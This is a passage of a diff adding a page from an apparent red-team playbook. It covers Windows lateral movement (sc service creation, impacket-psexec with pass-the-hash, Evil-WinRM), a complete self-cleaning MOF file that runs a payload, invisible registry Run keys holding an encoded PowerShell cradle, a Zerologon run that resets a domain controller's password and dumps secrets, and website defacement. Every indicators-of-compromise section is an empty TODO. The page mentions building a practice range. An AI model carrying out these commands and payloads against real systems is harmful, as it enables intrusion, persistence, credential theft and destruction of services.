+<h3 id="method-2---manually-psexecing-with-sc"><a class="header" href="#method-2---manually-psexecing-with-sc">Method 2 - Manually PsExecing with SC</a></h3>
+<p>From a Windows client, upload the binary you wish to execute on the target and start a remote service with the following commands (there is supposed to be a space after binPath):</p>
+<pre><code class="language-cmd">copy payload.exe \\remote.server.com\ADMIN$
+sc \\remote.server.com create servicename binPath= &quot;C:\Windows\payload.exe&quot;
+sc \\remote.server.com start servicename
+</code></pre>
+<h4 id="indicators-of-compromise-10"><a class="header" href="#indicators-of-compromise-10">Indicators of Compromise</a></h4>
+<p>TODO</p>
+<h3 id="method-3---impacket-psexec"><a class="header" href="#method-3---impacket-psexec">Method 3 - Impacket-PsExec</a></h3>
+<p>The impacket library was created in python, so as long as python and impacket are installed, this should work from any OS that supports python.</p>
+<pre><code class="language-bash">impacket-psexec DOMAIN/USERNAME:'PASSWORD'@target
+</code></pre>
+<p>If you do not have or know the password, but you do have the NTLM hash, then impacket also supports Pass The Hash (Only place the part of the hash after the colon in this command):</p>
+<pre><code class="language-bash">impacket-psexec -hashes :NTHASH DOMAIN/USERNAME@target
+</code></pre>
+<h4 id="indicators-of-compromise-11"><a class="header" href="#indicators-of-compromise-11">Indicators of Compromise</a></h4>
+<p>TODO</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="mof-upload"><a class="header" href="#mof-upload">MOF Upload</a></h1>
+<h2 id="summary-7"><a class="header" href="#summary-7">Summary</a></h2>
+<p>Pre-Windows Vista (Not including vista) have an interesting vulnerability that can be used to gain code execution when two files are written to specific directories using any method. There might be a way of using this Post-Windows Vista, but they don't get auto-compiled anymore. More research is needed.</p>
+<h2 id="prerequisites-6"><a class="header" href="#prerequisites-6">Prerequisites</a></h2>
+<p>A Pre-Windows Vista install is required, and some method of writing to both &quot;C:\Windows\System32&quot; and &quot;C:\Windows\System32\wbem\mof&quot; is required for this exploit.</p>
+<h2 id="setup-6"><a class="header" href="#setup-6">Setup</a></h2>
+<p>Pick any method of allowing the attacker to write to the &quot;C:\Windows\System32&quot; and &quot;C:\Windows\System32\wbem\mof&quot; folders. This exploit can be used as privilege escalation or as initial access. SMB, TFTP, FTP, etc, are all viable setups.</p>
+<h2 id="execution-6"><a class="header" href="#execution-6">Execution</a></h2>
+<h3 id="method-1---auto-compiling-mof"><a class="header" href="#method-1---auto-compiling-mof">Method 1 - Auto-compiling MOF</a></h3>
+<p>The first step is to upload the intended binary to &quot;C:\Windows\System32&quot;, and then to upload a custom MOF file to &quot;C:\Windows\System32\wbem\mof&quot;. Replace any instance of &quot;payload.exe&quot; below with the name of the executable uploaded. Below is the file that should be uploaded to the MOF directory:</p>
+<pre><code class="language-mof">#pragma namespace(&quot;\\\\.\\root\\cimv2&quot;)
+class MyClass89
+{
+	[key] string Name;
+};
+class ActiveScriptEventConsumer : __EventConsumer
+{
+	[key] string Name;
+	[not_null] string ScriptingEngine;
+	string ScriptFileName;
+	[template] string ScriptText;
+	uint32 KillTimeout;
+};
+instance of __Win32Provider as $P
+{
+	Name  = &quot;ActiveScriptEventConsumer&quot;;
+	CLSID = &quot;{266c72e7-62e8-11d1-ad89-00c04fd8fdff}&quot;;
+	PerUserInitialization = TRUE;
+};
+instance of __EventConsumerProviderRegistration
+{
+	Provider = $P;
+	ConsumerClassNames = {&quot;ActiveScriptEventConsumer&quot;};
+};
+Instance of ActiveScriptEventConsumer as $cons
+{
+	Name = &quot;ASEC&quot;;
+	ScriptingEngine = &quot;JScript&quot;;
+	ScriptText = &quot;\ntry {var s = new ActiveXObject(\&quot;Wscript.Shell\&quot;);\ns.Run(\&quot;payload.exe\&quot;);} catch (err) {};\nsv = GetObject(\&quot;winmgmts:root\\\\cimv2\&quot;);try {sv.Delete(\&quot;MyClass89\&quot;);} catch (err) {};try {sv.Delete(\&quot;__EventFilter.Name='instfilt'\&quot;);} catch (err) {};try {sv.Delete(\&quot;ActiveScriptEventConsumer.Name='ASEC'\&quot;);} catch(err) {};&quot;;
+	
+};
+Instance of ActiveScriptEventConsumer as $cons2
+{
+	Name = &quot;qndASEC&quot;;
+	ScriptingEngine = &quot;JScript&quot;;
+	ScriptText = &quot;\nvar objfs = new ActiveXObject(\&quot;Scripting.FileSystemObject\&quot;);\ntry {var f1 = objfs.GetFile(\&quot;wbem\\\\mof\\\\good\\\\baud.mof\&quot;);\nf1.Delete(true);} catch(err) {};\ntry {\nvar f2 = objfs.GetFile(\&quot;payload.exe\&quot;);\nf2.Delete(true);\nvar s = GetObject(\&quot;winmgmts:root\\\\cimv2\&quot;);s.Delete(\&quot;__EventFilter.Name='qndfilt'\&quot;);s.Delete(\&quot;ActiveScriptEventConsumer.Name='qndASEC'\&quot;);\n} catch(err) {};&quot;;
+};
+instance of __EventFilter as $Filt
+{
+	Name = &quot;instfilt&quot;;
+	Query = &quot;SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \&quot;MyClass89\&quot;&quot;;
+	QueryLanguage = &quot;WQL&quot;;
+};
+instance of __EventFilter as $Filt2
+{
+	Name = &quot;qndfilt&quot;;
+	Query = &quot;SELECT * FROM __InstanceDeletionEvent WITHIN 1 WHERE TargetInstance ISA \&quot;Win32_Process\&quot; AND TargetInstance.Name = \&quot;payload.exe\&quot;&quot;;
+	QueryLanguage = &quot;WQL&quot;;
+	
+};
+instance of __FilterToConsumerBinding as $bind
+{
+	Consumer = $cons;
+	Filter = $Filt;
+};
+instance of __FilterToConsumerBinding as $bind2
+{
+	Consumer = $cons2;
+	Filter = $Filt2;
+};
+instance of MyClass89 as $MyClass
+{
+	Name = &quot;ClassConsumer&quot;;
+};
+</code></pre>
+<p>Once this file is uploaded, then the exe that was uploaded should get executed.</p>
+<h4 id="indicators-of-compromise-12"><a class="header" href="#indicators-of-compromise-12">Indicators of Compromise</a></h4>
+<p>TODO</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="winrm"><a class="header" href="#winrm">WinRM</a></h1>
+<h2 id="summary-8"><a class="header" href="#summary-8">Summary</a></h2>
+<p>WinRM, or Windows Remote Management, is a feature that can be enabled on any Windows Server. Usage of this service requires credentials (or the NTLM hash) of a user that has permissions. The WinRM service starts automatically on Windows Server 2008 and later. On earlier versions of Windows (client or server), you need to start the service manually.</p>
+<h2 id="prerequisites-7"><a class="header" href="#prerequisites-7">Prerequisites</a></h2>
+<p>A windows server must be set up and configured to use WinRM, with at least one user who has access to this service.</p>
+<h2 id="setup-7"><a class="header" href="#setup-7">Setup</a></h2>
+<p>To configure winrm, use the following command as an administrator:</p>
+<pre><code class="language-cmd">winrm quickconfig
+</code></pre>
+<h2 id="execution-7"><a class="header" href="#execution-7">Execution</a></h2>
+<h3 id="method-1---evil-winrm"><a class="header" href="#method-1---evil-winrm">Method 1 - Evil-WinRM</a></h3>
+<p>Evil-WinRM is written in Ruby, ruby must be installed for this tool to work. Using the credentials of the user that has access to the WinRM service, run one of the following commands to obtain access to the target.</p>
+<p>Connect to a host:</p>
+<p><code>evil-winrm --ip &lt;target&gt; --user &lt;user&gt; --password &lt;password&gt;</code></p>
+<p>Connect to a host, passing the hash instead of using a password:</p>
+<p><code>evil-winrm --ip &lt;target&gt; --user &lt;user&gt; --hash &lt;nt_hash&gt;</code></p>
+<h4 id="indicators-of-compromise-13"><a class="header" href="#indicators-of-compromise-13">Indicators of Compromise</a></h4>
+<p>TODO</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="windows-persistence"><a class="header" href="#windows-persistence">Windows Persistence</a></h1>
+<ul>
+<li><a href="./invisreg.html">Invisible Registry Keys</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="invisible-registry-keys"><a class="header" href="#invisible-registry-keys">Invisible Registry Keys</a></h1>
+<h2 id="summary-9"><a class="header" href="#summary-9">Summary</a></h2>
+<p>It's possible to craft invisible registry keys that the Windows NT kernel is able to read, but not any user-mode applications. This allows for some unique cases of persistence that is hard to detect from the defenders perspective.</p>
+<h2 id="prerequisites-8"><a class="header" href="#prerequisites-8">Prerequisites</a></h2>
+<p>The target must be windows, and you must run this tool with the appropriate access rights required for the hive you're trying to write to. HKLM requires Administrator/SYSTEM privileges, HKCU can be modified by the current user.</p>
+<h2 id="setup-8"><a class="header" href="#setup-8">Setup</a></h2>
+<p>This setup requires downloading and executing the following utility, defender may or may not catch this file on disk. Potentially use a <a href="./windows_reflective_pe_loader.html">reflective PE loader</a> to avoid this issue. The executable in question can be found at https://github.com/NukingDragons/invisreg. Go to Releases and download the latest executable, compilation is not required.</p>
+<h2 id="execution-8"><a class="header" href="#execution-8">Execution</a></h2>
+<h3 id="method-1---invisregexe"><a class="header" href="#method-1---invisregexe">Method 1 - invisreg.exe</a></h3>
+<p>Running invisreg.exe without any options will provide the following output:</p>
+<pre><code class="language-help">Usage: invisreg [operation] [path] [type] [value]
+       operations:
+         create - Create a new invisible registry key
+         edit   - Edit an existing invisible registry key
+         delete - Delete an existing invisible registry key
+         query  - Query an invisible registry key
+       path:
+         Like this - HKLM:\PATH\TO\KEY
+         supported hives:
+           HKLM        - HKEY_LOCAL_MACHINE
+           HKCU or HCU - HKEY_CURRENT_USER
+           HKCR        - HKEY_CLASSES_ROOT
+           HKCC        - HKEY_CURRENT_CONFIG
+           HKU         - HKEY_USERS
+       type:
+         REG_SZ        - Value is expected to be a string
+         REG_DWORD     - Value is expected to be a 32-bit integer
+         REG_QWORD     - Value is expected to be a 64-bit integer
+         REG_BINARY    - Value is expected to be the name of a file
+       value:
+         ...
+
+Examples:
+       invisreg create HKLM:\SOFTWARE\MICROSOFT\Windows\CurrentVersion\Run\KeyName REG_SZ &quot;calc.exe&quot;
+       invisreg edit HKLM:\SOFTWARE\MICROSOFT\Windows\CurrentVersion\Run\KeyName REG_DWORD 1337
+       invisreg delete HKLM:\SOFTWARE\MICROSOFT\Windows\CurrentVersion\Run\KeyName
+       invisreg query HKLM:\SOFTWARE\MICROSOFT\Windows\CurrentVersion\Run\KeyName
+</code></pre>
+<p>To install a powershell cradle into the run key for persistence, the following command can be used:</p>
+<pre><code class="language-cmd">.\invisreg.exe create HKLM:\SOFTWARE\MICROSOFT\Windows\CurrentVersion\Run\Cradle REG_SZ &quot;powershell -enc &lt;base64&gt;&quot;
+</code></pre>
+<p>Or for a specific user:</p>
+<pre><code class="language-cmd">.\invisreg.exe create HKCU:\SOFTWARE\MICROSOFT\Windows\CurrentVersion\Run\Cradle REG_SZ &quot;powershell -enc &lt;base64&gt;&quot;
+</code></pre>
+<h4 id="indicators-of-compromise-14"><a class="header" href="#indicators-of-compromise-14">Indicators of Compromise</a></h4>
+<p>TODO</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="active-directory"><a class="header" href="#active-directory">Active Directory</a></h1>
+<ul>
+<li><a href="./ACTIVE_DIRECTORY_VULNERABILITIES.html">Vulnerabilities</a>
+<ul>
+<li><a href="./zerologon.html">Zerologon (CVE-2020-1472)</a></li>
+</ul>
+</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="active-directory-vulnerabilities"><a class="header" href="#active-directory-vulnerabilities">Active Directory Vulnerabilities</a></h1>
+<ul>
+<li><a href="./zerologon.html">Zerologon (CVE-2020-1472)</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="zerologon-cve-2020-1472"><a class="header" href="#zerologon-cve-2020-1472">Zerologon (CVE-2020-1472)</a></h1>
+<h2 id="summary-10"><a class="header" href="#summary-10">Summary</a></h2>
+<p>This vulnerability stems from a flaw in a cryptographic authentication scheme used by the Netlogon Remote Protocol, which among other things can be used to update computer passwords. This flaw allows attackers to impersonate any computer, including the domain controller itself, and execute remote procedure calls on their behalf. </p>
+<h2 id="prerequisites-9"><a class="header" href="#prerequisites-9">Prerequisites</a></h2>
+<p>This exploit requires at least one DC to be set up and configured. The DC <em>must</em> not have the patch, i.e. install the DC from before August 11th, 2020. <strong>Windows Server 2008 R2 SP1</strong> requires an ESU license for the patch to apply, which is atypical, making this version the ideal target for configuring a range with this vulnerability.</p>
+<h2 id="setup-9"><a class="header" href="#setup-9">Setup</a></h2>
+<p>If the prerequisites have been met, then any Zerologon exploit should work out of the box.</p>
+<h2 id="execution-9"><a class="header" href="#execution-9">Execution</a></h2>
+<h3 id="method-1---changing-dcs-machine-account-password"><a class="header" href="#method-1---changing-dcs-machine-account-password">Method 1 - Changing DC's Machine Account Password</a></h3>
+<p>Clone the repository at https://github.com/risksense/zerologon, by either downloading the zip file or running the following command:</p>
+<pre><code class="language-bash">git clone https://github.com/risksense/zerologon
+</code></pre>
+<p>If there are any issues, update or reinstall impacket. Then, in the same directory as the cloned repository, run the following command:</p>
+<pre><code class="language-bash">python3 set_empty_pw DC_NETBIOS_NAME DC_IP_ADDR
+</code></pre>
+<p>Then, the DC's machine accounts hash is set to <code>31d6cfe0d16ae931b73c59d7e0c089c0</code>, and the old hash should be printed to the screen, note this for later. This can be used with impacket's pass-the-hash functionality. I.e. dumping secret:</p>
+<pre><code class="language-bash">secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'DOMAIN/DC_NETBIOS_NAME$@dc_ip_addr'
+</code></pre>
+<p>To reinstall the old machine password, run the following command:</p>
+<pre><code class="language-bash">python3 reinstall_original_pw.py DC_NETBIOS_NAME DC_IP_ADDR ORIG_NT_HASH
+</code></pre>
+<h4 id="indicators-of-compromise-15"><a class="header" href="#indicators-of-compromise-15">Indicators of Compromise</a></h4>
+<p>TODO</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="impact"><a class="header" href="#impact">Impact</a></h1>
+<ul>
+<li><a href="./website_defacement.html">Website Defacement</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="website-defacement"><a class="header" href="#website-defacement">Website Defacement</a></h1>
+<h2 id="summary-11"><a class="header" href="#summary-11">Summary</a></h2>
+<p>Website defacement is a destructive and loud method of denying or humiliating a service or company. In this case, the website will be replaced with a &quot;King of the Hill&quot; themed propane selling service.</p>
+<h2 id="prerequisites-10"><a class="header" href="#prerequisites-10">Prerequisites</a></h2>
+<p>The target webserver must support PHP in order to host the defaced webroot contents.</p>
+<h2 id="setup-10"><a class="header" href="#setup-10">Setup</a></h2>
+<p>Download <a href="./misc-attachments/papa_www.zip">this</a> file, it contains the contents to be placed in the targets webroot. Often times this is in /var/www/html, but check the running webservers config file to verify.</p>
+<h2 id="execution-10"><a class="header" href="#execution-10">Execution</a></h2>
+<h3 id="method-1---extract-using-unzip"><a class="header" href="#method-1---extract-using-unzip">Method 1 - Extract using Unzip</a></h3>
+<p>To upload the file to the machine, one possible way is to use <code>scp</code> or to host a python webserver and then use <code>wget</code> on the target webserver. Prior to extracting, either delete or move the contents of the old webroot. Then, once the file is uploaded, its time to locate and enter the webroot of the server, then run the following command:</p>
+<pre><code class="language-bash">cd /var/www/html # Most common webroot location
+unzip /path/to/papa_www.zip
+</code></pre>
+<h4 id="indicators-of-compromise-16"><a class="header" href="#indicators-of-compromise-16">Indicators of Compromise</a></h4>
+<p>TODO, but its going to be loud and obvious</p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                        
+                        
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                
+                            </nav>
+
+        </div>
+
+        
+        
+        
+                <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        
+        
+                <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
+        
+        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+        
+                        <script type="text/javascript">
+        window.addEventListener('load', function() {
+            window.setTimeout(window.print, 100);
+        });
+        </script>
+                
+    </body>
+</html>
